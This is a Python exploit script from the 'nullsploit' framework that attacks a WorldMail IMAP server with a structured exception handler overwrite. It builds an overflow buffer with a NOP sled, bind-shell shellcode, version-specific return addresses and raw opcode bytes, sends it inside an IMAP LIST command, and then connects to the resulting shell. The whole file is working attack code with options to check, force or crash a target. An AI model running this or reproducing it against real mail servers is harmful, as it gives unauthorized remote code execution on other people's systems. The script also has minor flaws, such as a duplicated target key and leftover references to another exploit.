#!/usr/bin/env python
"""
    nullsploit :: Remote Code Executon for WorldMail3.0 IMAP Server

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")
import time
import argparse
import struct
import shellcode
import tcpexploit
import exploitutils

BANNER                          = "WorldMail IMAP4 Server 6.1.19.0" 
TARGETS                         = {
    0 : ['Automatic', struct.pack("<I", 0x10013B4E)],
    1 : ['Version 6.1.19.0', struct.pack("<I", 0x10013B4E)],
    2 : ['Version 6.1.20.0', struct.pack("<I", 0x10022187)],
    3 : ['Version 6.1.22.0', struct.pack("<I", 0x10022187)],
    3 : ['Debug', struct.pack("<I",0x42424242)]
    }

def main():
    args = arg_parse()

    if args.targets:
        print "Exploit targets avaiable:"
        print " ======================= "
        for i in TARGETS:
            print TARGETS[i][0]
        sys.exit()

    if args.port:
        PORT = int(args.port)
    else:
        PORT = int(143)
    if args.payload:
        PAYLOAD = args.payload
    else:
        PAYLOAD = 'win32bind'
    if not args.debug:
        TARGET=TARGETS[0][1]
    else:
        TARGET=TARGETS[1][1]
    if args.rhost:
        HOST = args.rhost
    else:
       print "No target specified"
       sys.exit()

    if args.check:
        checkVulnerability( HOST, PORT )
        sys.exit()

    if args.force:
        run( HOST, PORT, TARGET, PAYLOAD )
        sys.exit()

    checkVulnerability( HOST, PORT )
    run( HOST, PORT, TARGET, PAYLOAD )

def arg_parse():
    parser = argparse.ArgumentParser(add_help=True,
            epilog='Example: exploits/remote/windows/freefloat/freefloat.py --\
rhost 192.168.56.101 --payload win32bind')
    parser.add_argument('--rhost', dest='rhost', help='Target IP / Hostname')
    parser.add_argument('--port', dest='port', help='Target service port')
    parser.add_argument('--payload', dest='payload', help='Shellcode to use')
    parser.add_argument('--force', action='store_true', help='Ignore all checks\
            and send the exploits')
    parser.add_argument('--check', action='store_true', help='Do not exploit\
            vulnerable target')
    parser.add_argument('--debug', action='store_true', help='Crash the target\
            only')
    parser.add_argument('--targets', action='store_true', help='Print available\
            targets')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    args = parser.parse_args()

    return args

def checkVulnerability(HOST, PORT):
    # Check banner for Freefloat 1.0
    response = tcpexploit.bannerchecktest(HOST, PORT, BANNER)
    if response == True:
        print " [+] Target appears vulnerable"
    else:
        print " [-] Target is not vulnerable"
        sys.exit()

def makeSploit( TARGET, PAYLOAD ):
    """
    Construct the attack
    """
    OFFSET=768
    BADCHARS='\x00\x0a\x0d'
    stack= "\x90"*12
    stack+= shellcode.generateshellcode( PAYLOAD, BADCHARS )
    stack+= exploitutils.randomstring( OFFSET - len(stack))
    stack+= "\xeb\x06\x90\x90" # Next SEH
    stack+= TARGETS[0][1] # SEH
    stack+=("\xdb\xc5\xbd\xfc\x37\x63\x33\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x03"
    "\x31\x6f\x17\x83\xc7\x04\x03\x93\x24\x81\xc6\xea\x8f\x81\x2c\xec"
    "\x0f\xf5\xcb")

    SPLOITSTRING = "a0001 LIST }" + stack + "}\r\n"
    return SPLOITSTRING

def run( HOST, PORT, TARGET, PAYLOAD ):
    
    SPLOITSTRING = makeSploit( TARGET, PAYLOAD )
    SUCCESS = tcpexploit.exploit( HOST, PORT, SPLOITSTRING )
    if SUCCESS != True:
        print " [-] Exploit failed!"
        sys.exit()
    print " [+] Retreiving our shell\n"
    time.sleep(5)
    exploitutils.handler( HOST, PAYLOAD )

main()
